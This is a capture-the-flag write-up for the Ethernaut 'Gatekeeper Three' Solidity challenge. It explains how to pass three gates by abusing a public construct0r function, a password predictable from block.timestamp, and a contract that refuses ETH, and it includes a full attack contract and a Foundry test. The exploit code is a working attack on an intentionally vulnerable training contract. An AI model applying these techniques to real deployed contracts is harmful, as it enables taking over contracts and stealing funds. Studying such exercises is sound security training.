# Level 28 - Gatekeeper Three

## Objectives

- cope with gates and become an entrant.

## Contract Overview

The Solidity contract `SimpleTrick` consists of functions designed to handle password verification and trick execution. It includes `checkPassword(uint256 _password)` to verify passwords, `trickInit()` to initialize a trick, and `trickyTrick()` to execute a trick if conditions are met.

In parallel, the `GatekeeperThree` contract contains functions such as `getAllowance(uint256 _password)` to permit entrance based on password validation, `createTrick()` to instantiate a new trick, and `enter()` for gate entry. Each function has specific conditions, like ownership verification and allowance checks, enforced through modifiers.

Both contracts facilitate interactions where password authentication is crucial, enabling controlled access and trick execution based on predefined criteria. Additionally, the `GatekeeperThree` contract manages entrance permissions and trick creation, ensuring secure and controlled interactions within the system.

## Finding the weak spots - Gate One

Let's break down the `gateOne` modifier:

```solidity

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

```

This modifier ensures that only the contract owner can call the function and prohibits the contract owner from being the original sender of the transaction.

To exploit this, we can manipulate the `owner` variable by invoking the `construct0r` function, which sets `owner` to the sender's address. It is worth noting that `construct0r` is a regular function, not a constructor, so we can call it like any other function to become the owner.

The second condition, preventing the contract owner from being the original sender, can be bypassed by initiating the transaction from a smart contract rather than an externally-owned account. This is because `tx.origin` refers to the original sender of the transaction, while `msg.sender` refers to the current caller of the function.

## Finding the weak spots - Gate Two

The second gate, represented by the `gateTwo` modifier, ensures that the correct password has been provided to the `SimpleTrick` contract before allowing access:

```solidity
modifier gateTwo() {
  require(allow_entrance == true);
  _;
}
```

To enable entrance, the `getAllowance` function within the `GatekeeperThree` contract must be called with the correct password:

```solidity
function getAllowance(uint _password) public {
  if (trick.checkPassword(_password)) {
      allow_entrance = true;
  }
}
```

Inside the `SimpleTrick` contract, the `checkPassword` function verifies that the password matches the one set in the contract's storage. If the provided password matches, the function returns true; otherwise, it updates the password to the current block timestamp and returns false:

```solidity
function checkPassword(uint _password) public returns (bool) {
  if (_password == password) {
    return true;
  }
  password = block.timestamp;
  return false;
}
```

Attacker can query the password from the appropriate storage slot via `vm.load()` or just simply using `block.timestamp`.

## Finding the weak spots - Gate Three

```solidity
    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

```

We need to meet two conditions to pass `gateThree`:

- The balance of the current contract `(address(this))` needs to exceed `0.001 ether`.
- Sending `0.001 ether` to the contract `owner` (accessed via` payable(owner)`) must result in a failure.

It requires an attacker contract to achieve this by employing some mechanism, such as `revert()`, to reject any incoming ETH.

## Plan of the attack

1. Attacker creates `AttackGatekeeperThree` contract providing the address of the `GatekeeperThree` contract.
2. Attacker calls the `attack()` function in the `AttackGatekeeperThree` contract that is invoking `construct0r()` on `GatekeeperThree` contract making him the owner of the `GatekeeperThree` contract.
3. Attacker calls `createTrick()` by calling the `attack()` function to get deploy a new `SimpleTrick` contract.
4. Attacker runs the `getAllowance()` by calling the `attack()` function with the password `block.timestamp`.
5. Attacker sends `0.0011 ether` to the `GatekeeperThree` contract address by calling the `attack()` function, rejecting any incoming ETH.
6. Attacker becomes `entrant` by calling `enter` function.

## Malicious contract (AttackGatekeeperThree.sol)

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./GatekeeperThree.sol";

contract AttackGatekeeperThree {
    GatekeeperThree victimContract;

    // 1. Attacker creates `AttackGatekeeperThree` contract providing the address of the `GatekeeperThree` contract.
    constructor(address _victimContract) {
        victimContract = GatekeeperThree(payable(_victimContract));
    }

    function attack() public payable {
        // 2. Attacker calls the `attack()` function in the `AttackGatekeeperThree` contract that is invoking `construct0r()` on `GatekeeperThree` contract making him the owner of the `GatekeeperThree` contract.

        victimContract.construct0r();

        // 3. Attacker calls `createTrick()` by calling the `attack()` function to get deploy a new `SimpleTrick` contract.
        victimContract.createTrick();

        // 4. Attacker runs the `getAllowance()` by calling the `attack()` function with the password
        victimContract.getAllowance(block.timestamp);

        // 5. Attacker sends `0.0011 ether` to the `GatekeeperThree` contract address by calling the `attack()` function, rejecting any incoming ETH.
        (bool sent, ) = payable(victimContract).call{value: msg.value}("");

        require(sent, "Fail to send ether");

        // 6. Attacker becomes `entrant` by calling `enter` function.
        victimContract.enter();
    }

    // 5. Attacker sends `0.0011 ether` to the `GatekeeperThree` contract address by calling the `attack()` function, rejecting any incoming ETH.
    receive() external payable {
        revert("Fail to send to this contract!");
    }
}


```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/28-GatekeeperThree.t.sol))

```solidity


        // 1. Attacker creates `AttackGatekeeperThree` contract providing the address of the `GatekeeperThree` contract.
        AttackGatekeeperThree attackGatekeeperThree = new AttackGatekeeperThree(
            address(ethernautGatekeeperThree)
        );

        emit log_named_address(
            "Address of entrant before attack: ",
            address(ethernautGatekeeperThree.entrant())
        );

        // 2. Attacker calls the `attack()` function in the `AttackGatekeeperThree` contract that is invoking `construct0r()` on `GatekeeperThree` contract making him the owner of the `GatekeeperThree` contract.
        attackGatekeeperThree.attack{value: 0.0011 ether}();

        emit log_named_address(
            "Address of entrant after attack: ",
            address(ethernautGatekeeperThree.entrant())
        );

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/GatekeeperThree.png)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [alex0207s](https://github.com/alex0207s/ethernaut-foundry-boilerplate)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
